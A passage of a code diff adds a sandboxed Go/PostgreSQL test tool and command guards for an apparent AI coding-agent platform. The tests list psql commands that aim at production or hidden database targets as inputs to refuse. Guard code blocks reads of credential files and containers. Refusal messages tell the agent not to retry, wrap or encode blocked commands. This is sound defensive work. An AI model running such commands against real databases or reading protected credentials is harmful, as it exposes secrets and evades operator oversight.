++    "psql 'postgresql://u@[::1]:5432,[2001:db8::1]:5432/x'",
++    "PGHOSTADDR=10.0.0.5 psql x",
++    "PGHOST=localhost,db.prod.internal psql x",
++    "PGSERVICE=prod psql",
++    "PGSERVICEFILE=/tmp/pg_service.conf psql",
++    "export PGSERVICE=test; go test ./...",
++    "psql 'service=prod'",
++    "psql 'postgresql:///x?service=prod'",
++])
++def test_database_target_block_refuses_hidden_targets(command):
++    assert dtt.database_target_block(command), command
++
++
++@pytest.mark.parametrize("command", [
++    "psql postgresql://u@127.0.0.1:55443/x_test",
++    "PGHOST=localhost psql x",
++    "psql 'postgresql://u@127.0.0.1:5432,localhost:5433/x?sslmode=disable'",
++    "psql 'postgresql:///x?host=/var/run/postgresql'",
++    "psql 'host=127.0.0.1 hostaddr=127.0.0.1 dbname=x'",
++    "PGHOSTADDR=127.0.0.1 psql x",
++    RUN370,
++])
++def test_database_target_block_allows_loopback(command):
++    assert dtt.database_target_block(command) is None
++
++
++# ------------------------------------------------------------ redaction ---
++
++def test_redact_covers_dict_keys():
++    key = f"TestX postgres://postgres:{CANARY}@127.0.0.1:55443/matching_test"
++    out = dtt._redact({key: {key: [key]}})
++    assert CANARY not in json.dumps(out)
++
++
++# --------------------------------------------------------- runner budget ---
++
++@pytest.mark.parametrize("vet,expected", [(False, 600 + 300), (True, 600 + 300 + 600)])
++def test_runner_budget_covers_vet(attested_backend, registry_file, worker_env, vet, expected):
++    req = dtt.validate_args({"profile": "validate-matching", "vet": vet, "timeout_seconds": 600}, _cfg())
++    assert dtt.runner_budget(req) == expected
++    calls = []
++
++    def fake_runner(argv, **kw):
++        calls.append(kw)
++        return _ok_runner(argv, **kw)
++
++    dtt.dev_test_run({"profile": "validate-matching", "vet": vet, "timeout_seconds": 600}, runner=fake_runner)
++    assert calls[0]["timeout"] == expected
++
++
++def test_runner_timeout_does_not_claim_containment(attested_backend, registry_file, worker_env):
++    def slow_runner(argv, **kw):
++        raise subprocess.TimeoutExpired(argv, kw["timeout"])
++
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching", "vet": True}, runner=slow_runner))
++    assert "killed" in out["error"] and "process-group cleanup" in out["error"]
++    assert "2100s" in out["error"]
+diff --git a/tools/approval.py b/tools/approval.py
+index d8f01e1440..06bdf99d29 100644
+--- a/tools/approval.py
++++ b/tools/approval.py
+@@ -583,6 +583,26 @@ def _unattended_deny(command: str, ctx: _Unattended) -> dict | None:
+     return None
+ 
+ 
++def _devtest_unattended_deny(command: str, ctx: _Unattended) -> dict | None:
++    """:func:`_unattended_deny` plus the registered dev-test hooks (tools.dev_test_tool): in deny
++    mode a non-loopback database target or a password on the command line is refused, and a
++    rejection that has a registered approved equivalent carries a RECOVERY directive naming it."""
++    result = None
++    if ctx.mode() == "deny":
++        db_target = _devtest_guard("database_target_block", command)
++        if db_target:
++            result = {"approved": False, "message": ctx.block_message(
++                f"Command names an unapproved database target ({db_target})", noun="dangerous commands",
++                advice="Find an alternative approach that avoids this command.")}
++    if result is None:
++        result = _unattended_deny(command, ctx)
++    if result is not None and not result.get("approved"):
++        hint = _devtest_guard("recovery_hint", command)
++        if hint:
++            result = {**result, "message": f"{result.get('message') or ''}{hint}"}
++    return result
++
++
+ # --- Human-decision engine shared by the three gates ----------------------------------------------------------------
+ # Every flagged action reaches a human the same way — selected plugin transport → gateway round-trip → pending
+ # fallback → CLI prompt → persist — so the consent contract (silence is not consent, deny is a hard halt, a smart-DENY
+@@ -947,7 +967,28 @@ def _floor_block(command: str, *, sudo_guard: bool = False) -> dict | None:
+         if is_sudo_guess:
+             logger.warning("Sudo stdin guard block: %s (command: %s)", sudo_guess_desc, command[:200])
+             return _sudo_stdin_block_result(sudo_guess_desc)
+-    return _user_deny_block(command)
++    return _user_deny_block(command) or _devtest_credential_block(command)
++
++
++def _devtest_guard(name: str, command: str):
++    """Hooks of the registered dev-test profiles (tools.dev_test_tool); additive only — an
++    absent or untrusted registry contributes nothing, and a guard error never allows more."""
++    try:
++        from tools import dev_test_tool
++        return getattr(dev_test_tool, name)(command)
++    except Exception as exc:  # pragma: no cover - defensive
++        logger.debug("dev-test guard %s failed: %s", name, exc)
++        return None
++
++
++def _devtest_credential_block(command: str) -> dict | None:
++    """Commands that would read a registered test credential (file or container env) never run,
++    under any approval mode: the model must not see it."""
++    message = _devtest_guard("credential_block", command)
++    if not message:
++        return None
++    logger.warning("Dev-test credential guard blocked command: %s", command[:200])
++    return _blocked(message, pattern_key="devtest-credential", description="registered test credential access")
+ 
+ 
+ def check_dangerous_command(command: str, env_type: str,
+@@ -1065,7 +1106,7 @@ def check_all_command_guards(command: str, env_type: str,
+     # unattended context applies its configured deny/approve mode, else allow.
+     if not is_cli and not is_gateway and not is_ask:
+         for ctx in _unattended_contexts():
+-            result = _unattended_deny(command, ctx)
++            result = _devtest_unattended_deny(command, ctx)
+             if result is not None:
+                 return result
+         return _approved()
+diff --git a/tools/dev_test_tool.py b/tools/dev_test_tool.py
+new file mode 100644
+index 0000000000..8765262794
+--- /dev/null
++++ b/tools/dev_test_tool.py
+@@ -0,0 +1,667 @@
++"""``dev_test_run``: registered Go/PostgreSQL development tests for Kanban coding workers.
++
++A typed tool instead of a terminal allowlist. The operator registers test profiles in a
++root-owned file (``/usr/local/etc/hermes-devtest/profiles.json``) installed together with a
++root-owned trusted runner whose SHA-256 the file pins (agent-ops-kit
++``scripts/install-hermes-devtest.sh``). On every call this tool:
++
++1. validates the typed arguments (profile name, approved package patterns, a test-name regex,
++   race/short/vet booleans, a bounded timeout); go flags cannot be expressed at all;
++2. requires the dispatcher-owned worker context (``HERMES_KANBAN_TASK``/``RUN_ID``; never a
++   delegate child or a cron run) and passes task and run to the runner, which re-checks them
++   against the board (this process must be the worker pid of the running claim) and the
++   repository lease of the profile's checkout;
++3. re-verifies the profile file and the runner (owner root, no group/other write, no
++   symlink, root-owned parent directories, digest equal to the pinned one) and fails closed
++   on any difference;
++4. scans the exact fixed invocation through the normal command guards (hardline floor,
++   dangerous patterns, Tirith); nothing is filtered or allowlisted;
++5. runs it with an empty environment and returns the runner's JSON (exit code, test, skip
++   and package counts, failing-test output), redacted again.
++
++Isolation: every profile must declare ``isolation.mode``. ``credential-broker-netns`` is the
++only mode this module recognises as a *proposed* acceptable design; any other mode (including
++the current ``same-uid-landlock``) is a rejected design. A recognised mode string is syntactic
++config validity only. Runnable readiness additionally needs an implemented, provisioned and
++attested backend for that mode (``backend_attested``); no such backend exists in this runtime,
++so ``runnable_profiles`` is empty, the tool is hidden, ``dev_test_run`` refuses before
++anything runs and no ``RECOVERY:`` directive is ever produced, regardless of what a root-owned
++registry declares. A future implementation must probe the trusted broker (identity, liveness,
++schema, capability) there; it must not be a string comparison, an environment variable or a
++boolean. The same-UID design was rejected in review: it does not meet the network or
++credential isolation requirements (tests running as the worker's uid can reach the network
++and the credential file). This module makes no claim that any design is sound; see
++``docs/dev-test-runner.md`` in agent-ops-kit.
++
++The credential and database-target guards are additive and must never depend on runnable
++readiness: they read the trusted registry leniently (``guard_registry``), so an older trusted
++profile file without ``isolation.mode`` still blocks credential reads.
++
++The module also carries the scanner-recovery state, per worker (task, run): a terminal command
++the unattended gate rejects that has an approved registered equivalent gets a recovery
++directive naming this tool, and ``kanban_block`` refuses until that equivalent was started or
++refused for a precondition outside the worker's control.
++"""
++
++from __future__ import annotations
++
++import hashlib
++import hmac
++import json
++import logging
++import os
++import re
++import shlex
++import stat
++import subprocess
++import threading
++import time
++from typing import Optional
++
++from tools.registry import no_cache_check_fn, registry, tool_error
++
++logger = logging.getLogger(__name__)
++
++CONFIG_PATH = "/usr/local/etc/hermes-devtest/profiles.json"
++TRUSTED_UID = 0
++TOOL_NAME = "dev_test_run"
++TIMEOUT_MIN, TIMEOUT_MAX, TIMEOUT_DEFAULT = 60, 3600, 1200
++RUNNER_GRACE = 300
++VET_BUDGET = 600
++APPROVED_ISOLATION_MODE = "credential-broker-netns"  # proposed design; recognised string, nothing more
++ISOLATION_REFUSAL = ("rejected isolation design; operator approval and privileged provisioning required, "
++                     "see docs/dev-test-runner.md in agent-ops-kit")
++NOT_IMPLEMENTED_REFUSAL = ("the proposed isolation design is recognised but no implemented, provisioned and "
++                           "attested backend exists in this runtime (a registry declaring the mode is config "
++                           "validity, not readiness); operator approval and privileged provisioning required, "
++                           "see docs/dev-test-runner.md in agent-ops-kit")
++PROFILE_RE = re.compile(r"^[a-z0-9][a-z0-9-]{0,47}$")
++PACKAGE_RE = re.compile(r"^\./(?:[A-Za-z0-9_][A-Za-z0-9_.-]*/)*(?:[A-Za-z0-9_][A-Za-z0-9_.-]*|\.\.\.)$")
++RUN_FILTER_RE = re.compile(r"^[A-Za-z0-9_^$|()./*+?\[\]-]{1,256}$")
++_ARG_KEYS = {"profile", "packages", "run", "race", "short", "vet", "timeout_seconds"}
++
++
++class DevTestRefused(Exception):
++    """Fail-closed refusal; the message is shown to the model verbatim."""
++
++
++# ------------------------------------------------------------------ trust ---
++
++def _check_trusted(path: str, trusted_uid: int, what: str, *, executable: bool = False) -> None:
++    if not isinstance(path, str) or not os.path.isabs(path) or os.path.normpath(path) != path:
++        raise DevTestRefused(f"{what} path {path!r} is not absolute and normalized")
++    try:
++        st = os.lstat(path)
++    except FileNotFoundError:
++        raise DevTestRefused(f"{what} {path} is not installed")
++    if stat.S_ISLNK(st.st_mode) or not stat.S_ISREG(st.st_mode):
++        raise DevTestRefused(f"{what} {path} is not a regular file (symlinks are refused)")
++    if st.st_uid != trusted_uid or st.st_mode & 0o022:
++        raise DevTestRefused(f"{what} {path} must be owned by uid {trusted_uid} and not group/other writable "
++                             f"(found uid {st.st_uid}, mode {oct(st.st_mode & 0o777)})")
++    if executable and not st.st_mode & 0o111:
++        raise DevTestRefused(f"{what} {path} is not executable")
++    parent = os.path.dirname(path)
++    while True:
++        pst = os.lstat(parent)
++        if stat.S_ISLNK(pst.st_mode) or pst.st_uid not in (trusted_uid, 0) or pst.st_mode & 0o022:
++            raise DevTestRefused(f"{what} directory {parent} is a symlink, foreign-owned or group/other writable")
++        if parent == "/":
++            return
++        parent = os.path.dirname(parent)
++
++
++def _read_nofollow(path: str, limit: int = 4 << 20) -> bytes:
++    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_CLOEXEC)
++    try:
++        chunks, total = [], 0
++        while True:
++            chunk = os.read(fd, 65536)
++            if not chunk:
++                return b"".join(chunks)
++            total += len(chunk)
++            if total > limit:
++                raise DevTestRefused(f"{path} is larger than {limit} bytes")
++            chunks.append(chunk)
++    finally:
++        os.close(fd)
++
++
++def load_registry(path: Optional[str] = None, trusted_uid: Optional[int] = None) -> dict:
++    """The root-owned profile file, trust-checked on every call (no caching)."""
++    path = CONFIG_PATH if path is None else path
++    trusted_uid = TRUSTED_UID if trusted_uid is None else trusted_uid
++    _check_trusted(path, trusted_uid, "dev-test profile file")
++    try:
++        cfg = json.loads(_read_nofollow(path, 1 << 20).decode("utf-8"))
++    except (ValueError, UnicodeDecodeError) as exc:
++        raise DevTestRefused(f"dev-test profile file {path} is not valid JSON: {exc}")
++    if not isinstance(cfg, dict) or cfg.get("version") != 1 or not isinstance(cfg.get("profiles"), dict):
++        raise DevTestRefused(f"dev-test profile file {path} has an unsupported shape")
++    for key in ("helper", "helper_sha256", "python"):
++        if not isinstance(cfg.get(key), str) or not cfg[key]:
++            raise DevTestRefused(f"dev-test profile file {path} lacks {key}")
++    for name, prof in cfg["profiles"].items():
++        isolation = prof.get("isolation") if isinstance(prof, dict) else None
++        mode = isolation.get("mode") if isinstance(isolation, dict) else None
++        if not isinstance(mode, str) or not mode:
++            raise DevTestRefused(f"dev-test profile file {path}: profile {name!r} lacks isolation.mode")
++    return cfg
++
++
++def guard_registry(path: Optional[str] = None, trusted_uid: Optional[int] = None) -> dict:
++    """The root-owned profile file for the *additive guards* only: trust-checked and shape-checked
++    like ``load_registry`` but without the per-profile ``isolation.mode`` requirement, so an
++    older trusted registry keeps blocking credential reads. Never used to run or expose anything."""
++    path = CONFIG_PATH if path is None else path
++    trusted_uid = TRUSTED_UID if trusted_uid is None else trusted_uid
++    _check_trusted(path, trusted_uid, "dev-test profile file")
++    try:
++        cfg = json.loads(_read_nofollow(path, 1 << 20).decode("utf-8"))
++    except (ValueError, UnicodeDecodeError) as exc:
++        raise DevTestRefused(f"dev-test profile file {path} is not valid JSON: {exc}")
++    if not isinstance(cfg, dict) or cfg.get("version") != 1 or not isinstance(cfg.get("profiles"), dict):
++        raise DevTestRefused(f"dev-test profile file {path} has an unsupported shape")
++    return cfg
++
++
++def approved_profiles(cfg: dict) -> dict:
++    """Profiles whose declared isolation mode is the recognised *proposed* design string.
++
++    Syntactic config validity only: membership here says nothing about whether the design is
++    implemented, provisioned or attested on this host. Use ``runnable_profiles`` for readiness."""
++    out = {}
++    for name, prof in (cfg.get("profiles") or {}).items():
++        isolation = prof.get("isolation") if isinstance(prof, dict) else None
++        if isinstance(isolation, dict) and isolation.get("mode") == APPROVED_ISOLATION_MODE:
++            out[name] = prof
++    return out
++
++
++def backend_attested(cfg: dict, profile: str, prof: dict) -> Optional[str]:
++    """Why ``profile`` has no runnable isolation backend, or None once one is attested.
++
++    No backend for any isolation mode is implemented in this runtime, so every profile is
++    refused with ``NOT_IMPLEMENTED_REFUSAL``. The only acceptable way to return None is a
++    future implementation that probes a trusted broker for identity, liveness, schema and
++    capability on every call; a mode string, environment variable or configuration flag is
++    never attestation and must not be accepted here."""
++    return NOT_IMPLEMENTED_REFUSAL
++
++
++def runnable_profiles(cfg: dict) -> dict:
++    """Profiles that are both the recognised design *and* have an attested backend (none today)."""
++    out = {}
++    for name, prof in approved_profiles(cfg).items():
++        if backend_attested(cfg, name, prof) is None:
++            out[name] = prof
++    return out
++
++
++def check_isolation(cfg: dict, profile: str) -> None:
++    """Fail closed: a rejected mode names the rejection; the recognised mode without an attested
++    backend names the missing implementation. Nothing is runnable unless both pass."""
++    prof = cfg["profiles"].get(profile) or {}
++    approved = approved_profiles(cfg)
++    if profile not in approved:
++        mode = (prof.get("isolation") or {}).get("mode")
++        raise DevTestRefused(f"profile '{profile}' has isolation mode {mode!r}: {ISOLATION_REFUSAL}")
++    reason = backend_attested(cfg, profile, prof)
++    if reason is not None:
++        raise DevTestRefused(f"profile '{profile}' (isolation mode {APPROVED_ISOLATION_MODE!r}): {reason}")
++
++
++def registered_or_none() -> Optional[dict]:
++    """The trusted registry for the additive guards (lenient shape, see ``guard_registry``), or
++    None when it is absent or untrusted (guards never raise)."""
++    try:
++        return guard_registry()
++    except Exception:
++        return None
++
++
++def runnable_registry_or_none() -> Optional[dict]:
++    """The strictly validated registry, or None; readiness surfaces (tool visibility, recovery
++    directives) use this and then ``runnable_profiles``."""
++    try:
++        return load_registry()
++    except Exception:
++        return None
++
++
++def verify_runner(cfg: dict, trusted_uid: Optional[int] = None) -> str:
++    """Trust + pinned digest of the runner and trust of its interpreter; returns the interpreter."""
++    trusted_uid = TRUSTED_UID if trusted_uid is None else trusted_uid
++    helper = cfg["helper"]
++    _check_trusted(helper, trusted_uid, "trusted runner")
++    digest = hashlib.sha256(_read_nofollow(helper)).hexdigest()
++    if not re.fullmatch(r"[0-9a-f]{64}", cfg["helper_sha256"]) or not hmac.compare_digest(digest, cfg["helper_sha256"]):
++        raise DevTestRefused(f"trusted runner {helper} does not match the pinned SHA-256 (tampered or not "
++                             "re-registered after an update); refusing to run it")
++    python = cfg["python"]
++    if not os.path.isabs(python):
++        raise DevTestRefused("interpreter path must be absolute")
++    _check_trusted(os.path.realpath(python), 0, "runner interpreter", executable=True)
++    return python
++
++
++# --------------------------------------------------------------- context ---
++
++def worker_identity() -> tuple:
++    """(task id, run id) of the dispatcher-owned worker this process is; else refuse."""
++    try:
++        from agent.delegation_context import is_delegated_child_process_context, is_dispatcher_owned_worker_context
++    except Exception as exc:  # pragma: no cover - import failure means no verified context
++        raise DevTestRefused(f"cannot verify the worker context: {exc}")
++    task = (os.environ.get("HERMES_KANBAN_TASK") or "").strip()
++    run = (os.environ.get("HERMES_KANBAN_RUN_ID") or "").strip()
++    if not task or is_delegated_child_process_context() or not is_dispatcher_owned_worker_context():
++        raise DevTestRefused(f"{TOOL_NAME} runs only in the dispatcher-owned Kanban worker of the card "
++                             "(not in delegate_task children, cron runs or other sessions)")
++    if not re.fullmatch(r"t_[0-9a-f]{6,16}", task) or not re.fullmatch(r"[1-9][0-9]{0,9}", run):
++        raise DevTestRefused("this worker has no valid task/run identity")
++    return task, run
++
++
++@no_cache_check_fn
++def _check_fn() -> bool:
++    try:
++        worker_identity()
++    except DevTestRefused:
++        return False
++    cfg = runnable_registry_or_none()
++    return bool(cfg and runnable_profiles(cfg))
++
++
++# ------------------------------------------------------------- arguments ---
++
++def validate_args(args: dict, cfg: dict) -> dict:
++    if not isinstance(args, dict):
++        raise DevTestRefused("arguments must be an object")
++    unknown = set(args) - _ARG_KEYS
++    if unknown:
++        raise DevTestRefused(f"unknown arguments {sorted(unknown)}; {TOOL_NAME} takes only {sorted(_ARG_KEYS)} "
++                             "(database URLs, go flags and environment are fixed by the registered profile)")
++    profile = args.get("profile")
++    if not isinstance(profile, str) or not PROFILE_RE.match(profile) or profile not in cfg["profiles"]:
++        raise DevTestRefused(f"profile must be one of {sorted(cfg['profiles'])}")
++    packages = args.get("packages", ["./..."])
++    if isinstance(packages, str):
++        packages = [packages]
++    if (not isinstance(packages, list) or not packages or len(packages) > 32
++            or not all(isinstance(p, str) and PACKAGE_RE.match(p) for p in packages)):
++        raise DevTestRefused("packages must be 1-32 relative package patterns like ./... or ./internal/db")
++    run = args.get("run")
++    if run is not None and (not isinstance(run, str) or not RUN_FILTER_RE.match(run)):
++        raise DevTestRefused("run must be a test-name regex of [A-Za-z0-9_^$|()./*+?[]-] without spaces or quotes")
++    flags = {}
++    for key, default in (("race", True), ("short", False), ("vet", False)):
++        value = args.get(key, default)
++        if not isinstance(value, bool):
++            raise DevTestRefused(f"{key} must be true or false")
++        flags[key] = value
++    timeout = args.get("timeout_seconds", TIMEOUT_DEFAULT)
++    if isinstance(timeout, bool) or not isinstance(timeout, int) or not TIMEOUT_MIN <= timeout <= TIMEOUT_MAX:
++        raise DevTestRefused(f"timeout_seconds must be an integer {TIMEOUT_MIN}..{TIMEOUT_MAX}")
++    return {"profile": profile, "packages": packages, "run": run, "timeout": timeout, **flags}
++
++
++def runner_argv(cfg: dict, python: str, task: str, run_id: str, req: dict) -> list:
++    argv = [python, "-I", "-S", cfg["helper"], "run", "--task", task, "--run-id", run_id,
++            "--profile", req["profile"]]
++    for pkg in req["packages"]:
++        argv += ["--package", pkg]
++    argv.append("--race" if req["race"] else "--no-race")
++    if req["short"]:
++        argv.append("--short")
++    if req["run"]:
++        argv += ["--run", req["run"]]
++    if req["vet"]:
++        argv.append("--vet")
++    return argv + ["--timeout", str(req["timeout"])]
++
++
++def runner_budget(req: dict) -> int:
++    """Wall-clock budget for the runner process: go test timeout + grace (+ go vet's own budget)."""
++    return req["timeout"] + RUNNER_GRACE + (VET_BUDGET if req["vet"] else 0)
++
++
++def _redact(value):
++    try:
++        from agent.redact import redact_sensitive_text
++    except Exception:  # pragma: no cover
++        return value
++    if isinstance(value, str):
++        return redact_sensitive_text(value, force=True)
++    if isinstance(value, list):
++        return [_redact(v) for v in value]
++    if isinstance(value, dict):
++        return {_redact(k) if isinstance(k, str) else k: _redact(v) for k, v in value.items()}
++    return value
++
++
++# --------------------------------------------------------------- handler ---
++
++def dev_test_run(args: dict, *, config_path: Optional[str] = None, trusted_uid: Optional[int] = None,
++                 runner=subprocess.run) -> str:
++    # Recovery state: an argument-validation refusal leaves the pending recovery in place; a
++    # precondition outside the worker's control records the refusal; a started runner clears it.
++    try:
++        identity = worker_identity()
++    except DevTestRefused as exc:
++        return tool_error(f"{TOOL_NAME} refused: {exc}")
++    task, run_id = identity
++    try:
++        cfg = load_registry(config_path, trusted_uid)
++    except DevTestRefused as exc:
++        return _precondition_refused(identity, None, exc)
++    try:
++        req = validate_args(args, cfg)
++    except DevTestRefused as exc:
++        return tool_error(f"{TOOL_NAME} refused: {exc}")
++    try:
++        check_isolation(cfg, req["profile"])
++        python = verify_runner(cfg, trusted_uid)
++        argv = runner_argv(cfg, python, task, run_id, req)
++        command = shlex.join(argv)
++        from tools.approval import check_all_command_guards
++        verdict = check_all_command_guards(command, "local")
++        if not verdict.get("approved"):
++            raise DevTestRefused(f"the command guards rejected the fixed runner invocation: {verdict.get('message')}")
++    except DevTestRefused as exc:
++        return _precondition_refused(identity, req["profile"], exc)
++    budget = runner_budget(req)
++    started = time.monotonic()
++    try:
++        proc = runner(argv, env={"PATH": "/usr/bin:/bin", "LANG": "C.UTF-8"}, cwd="/", stdin=subprocess.DEVNULL,
++                      capture_output=True, text=True, timeout=budget, close_fds=True)
++    except subprocess.TimeoutExpired:
++        mark_recovery_attempted(identity, profile=req["profile"])
++        return tool_error(f"{TOOL_NAME}: the runner did not finish within {budget}s and was killed; its descendants "
++                          "(go test, test binaries) may still be running and need the kit's process-group cleanup")
++    except OSError as exc:
++        return _precondition_refused(identity, req["profile"],
++                                     DevTestRefused(f"could not start the trusted runner: {exc}"))
++    mark_recovery_attempted(identity, profile=req["profile"])
++    try:
++        result = json.loads(proc.stdout)
++        if not isinstance(result, dict):
++            raise ValueError("not an object")
++    except ValueError:
++        return tool_error(f"{TOOL_NAME}: the runner exited {proc.returncode} without a result: "
++                          f"{_redact((proc.stdout + proc.stderr)[-2000:])}")
++    result["runner_exit"] = proc.returncode
++    result["invocation"] = command
++    result["wall_seconds"] = round(time.monotonic() - started, 1)
++    if proc.returncode == 2:
++        result["next_step"] = ("The runner refused (see error). Fix the named precondition (preflight for the lease, "
++                               "an approved package) and call dev_test_run again, or block naming this error.")
++    elif proc.returncode == 3:
++        result["next_step"] = "The sandbox is unavailable on this host; block naming this error. Never run the tests unsandboxed."
++    elif proc.returncode == 1:
++        result["next_step"] = "Tests or vet failed: read failed_tests/build_output, fix the code, run dev_test_run again."
++    return json.dumps(_redact(result), ensure_ascii=False)
++
++
++# ----------------------------------------------------- scanner recovery ---
++
++_RECOVERY_LOCK = threading.Lock()
++_PENDING_RECOVERY: dict = {}  # (task, run) -> {"profile", "at"[, "refused"]}
++_GO_TEST_RE = re.compile(r"(?:^|[\s;&|(])go\s+(?:test|vet)\b")
++
++
++def _matching_profile(command: str, cfg: dict) -> Optional[str]:
++    """A RUNNABLE profile the rejected command corresponds to: recognised design *and* attested
++    backend. A rejected mode or a recognised mode without a backend never matches, so no
++    directive points the worker at a tool that cannot run."""
++    profiles = runnable_profiles(cfg)
++    for name, prof in sorted(profiles.items()):
++        db = prof.get("database") or {}
++        markers = [str(db.get("url_env") or ""), str(db.get("pgpassfile") or ""),
++                   f"{db.get('host')}:{db.get('port')}", f"/{db.get('dbname')}"]
++        if any(m and m in command for m in markers if m not in ("None:None", "/None")):
++            return name
++    if len(profiles) == 1 and re.search(r"PGPASSFILE|DATABASE_URL", command):
++        return next(iter(profiles))
++    return None
++
++
++def recovery_hint(command: str) -> str:
++    """Directive appended to an unattended rejection when a registered equivalent exists."""
++    if not command or not _GO_TEST_RE.search(command):
++        return ""
++    try:
++        identity = worker_identity()
++    except DevTestRefused:
++        return ""
++    cfg = runnable_registry_or_none()
++    if not cfg:
++        return ""
++    profile = _matching_profile(command, cfg)
++    if not profile:
++        return ""
++    with _RECOVERY_LOCK:
++        _PENDING_RECOVERY[identity] = {"profile": profile, "at": time.time()}
++    return (f" RECOVERY: an approved equivalent exists. Do not retry, wrap, encode or script this command. "
++            f"Call {TOOL_NAME}(profile=\"{profile}\", packages=[\"./...\"], race=true, vet=<true if you also need "
++            f"go vet>, run=<optional test regex>) once as a new request; it runs the registered Go/PostgreSQL tests "
++            f"with the operator's credential file in a sandbox and returns exit code and pass/fail/skip counts. "
++            f"Continue from its result; block only if {TOOL_NAME} itself refuses, quoting its error.")
++
++
++def _current_identity() -> Optional[tuple]:
++    try:
++        return worker_identity()
++    except DevTestRefused:
++        return None
++
++
++def pending_recovery() -> Optional[dict]:
++    """The recovery entry of the current worker (task, run); None without a worker identity."""
++    identity = _current_identity()
++    if identity is None:
++        return None
++    with _RECOVERY_LOCK:
++        entry = _PENDING_RECOVERY.get(identity)
++        return dict(entry) if entry else None
++
++
++def mark_recovery_attempted(identity: Optional[tuple] = None, *, profile: Optional[str] = None,
++                            refused: Optional[str] = None) -> None:
++    """Resolve the pending recovery of ``identity`` (default: the current worker): drop it, or with
++    ``refused`` record the precondition refusal on it. A ``profile`` other than the one the
++    directive named resolves nothing."""
++    identity = identity or _current_identity()
++    if identity is None:
++        return
++    with _RECOVERY_LOCK:
++        entry = _PENDING_RECOVERY.get(identity)
++        if not entry or (profile is not None and entry.get("profile") != profile):
++            return
++        if refused is None:
++            del _PENDING_RECOVERY[identity]
++        else:
++            entry["refused"] = refused
++
++
++def _reset_recovery_state() -> None:
++    """Tests only: forget every worker's recovery state."""
++    with _RECOVERY_LOCK:
++        _PENDING_RECOVERY.clear()
++
++
++def _precondition_refused(identity: tuple, profile: Optional[str], exc: Exception) -> str:
++    message = f"{TOOL_NAME} refused: {exc}"
++    mark_recovery_attempted(identity, profile=profile, refused=message)
++    return tool_error(message)
++
++
++def block_refusal() -> Optional[str]:
++    """kanban_block refusal while a rejected command's approved equivalent is untried (a recorded
++    precondition refusal lets the worker block, quoting it)."""
++    pending = pending_recovery()
++    if not pending or pending.get("refused"):
++        return None
++    return (f"Not blocked: a terminal command was rejected by the security scanner but an approved equivalent "
++            f"exists and has not been tried. Call {TOOL_NAME}(profile=\"{pending['profile']}\", ...) first, verify "
++            f"its result and continue; block only if {TOOL_NAME} refuses (quote its error).")
++
++
++# ------------------------------------------------------- command guards ---
++
++_CONTAINER_VERBS = r"(?:exec|inspect|cp|export|commit|attach|top|diff)"
++
++
++def credential_block(command: str) -> Optional[str]:
++    """Hard block for commands that would read a registered test credential into the conversation:
++    the credential file (any reference other than a plain ``PGPASSFILE=<path>`` assignment, which
++    hands the path to a client without reading it) and the registered container's environment."""
++    if not command:
++        return None
++    cfg = registered_or_none()
++    if not cfg:
++        return None
++    home = os.path.expanduser("~")
++    for name, prof in cfg.get("profiles", {}).items():
++        db = prof.get("database") or {}
++        path = db.get("pgpassfile")
++        if isinstance(path, str) and path:
++            text = re.sub(r"(?:^|(?<=[\s;&|(]))PGPASSFILE=(['\"]?)" + re.escape(path) + r"\1(?=\s)", " ", command)
++            forms = {path, os.path.dirname(path)}
++            if path.startswith(home + "/"):
++                rel = path[len(home) + 1:]
++                forms |= {f"~/{rel}", f"$HOME/{rel}", f"${{HOME}}/{rel}",
++                          f"~/{os.path.dirname(rel)}", f"$HOME/{os.path.dirname(rel)}"}
++            if any(f and f in text for f in forms) or re.search(r"\$\{?PGPASSFILE\b", text):
++                return (f"BLOCKED: this command references the registered test-database credential file of "
++                        f"profile '{name}'. Its contents must never enter the conversation or logs. Run the tests "
++                        f"with {TOOL_NAME}(profile=\"{name}\"); it hands the file to the sandboxed tests only.")
++        container = prof.get("container")
++        if isinstance(container, str) and container and re.search(
++                r"\b(?:docker|podman)\s+(?:container\s+)?" + _CONTAINER_VERBS + r"\b[^;&|\n]*\b" + re.escape(container) + r"\b",
++                command):
++            return (f"BLOCKED: reading or entering the registered test-database container '{container}' would "
++                    f"expose its credentials. Use {TOOL_NAME}(profile=\"{name}\") for the tests.")
++    return None
++
++
++_DB_URL_RE = re.compile(r"(?i)\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|rediss?)://([^\s'\"/?#]*)([^\s'\"]*)")
++_PG_CLIENT_RE = re.compile(r"(?:^|[\s;&|(])(?:psql|pg_dump|pg_dumpall|pg_restore|pgbench|createdb|dropdb|vacuumdb|"
++                           r"reindexdb|clusterdb|pg_isready)\b([^;&|\n]*)")
++_LOOPBACK = {"127.0.0.1", "localhost", "::1", ""}
++_ENV_PREFIX = r"(?:^|[\s;&|(])"
++
++
++def _hosts_of(authority: str) -> tuple:
++    """(userinfo, [hosts]) of a URL authority; a multi-host authority yields every host."""
++    userinfo, _, hostports = authority.rpartition("@")
++    hosts = []
++    for hostport in hostports.split(","):
++        if hostport.startswith("["):
++            host = hostport[1:].split("]", 1)[0]
++        else:
++            host = hostport.rsplit(":", 1)[0] if hostport.count(":") <= 1 else hostport
++        hosts.append(host.lower())
++    return userinfo, hosts
++
++
++def _non_loopback(value: str) -> Optional[str]:
++    """First host of a (comma-separated) host list that is neither loopback nor a socket directory."""
++    from urllib.parse import unquote
++    for host in unquote(value).split(","):
++        host = host.strip().lower()
++        if host.startswith("[") and host.endswith("]"):
++            host = host[1:-1]
++        if host not in _LOOPBACK and not host.startswith("/"):
++            return host
++    return None
++
++
++def _host_refusal(host: str) -> str:
++    return f"database host '{host}' is not an approved loopback development database"
++
++
++_SERVICE_REFUSAL = ("a libpq service (PGSERVICE/PGSERVICEFILE/service=) names an unresolvable database target; "
++                    f"use the registered profile through {TOOL_NAME}")
++
++
++def database_target_block(command: str) -> Optional[str]:
++    """Unattended contexts only: database connection targets other than loopback, and passwords
++    written into a command line, are refused (nobody can approve a production connection).
++
++    This is NOT a security boundary: it is an additive text guard over the command string and
++    cannot see targets set indirectly (config files, variables expanded at run time, programs
++    choosing their own target). It only refuses more; it never approves anything."""
++    if not command:
++        return None
++    for m in _DB_URL_RE.finditer(command):
++        userinfo, hosts = _hosts_of(m.group(1))
++        if ":" in userinfo:
++            return ("a database password written into the command line (use the registered credential file "
++                    f"through {TOOL_NAME})")
++        for host in hosts:
++            if host not in _LOOPBACK:
++                return _host_refusal(host)
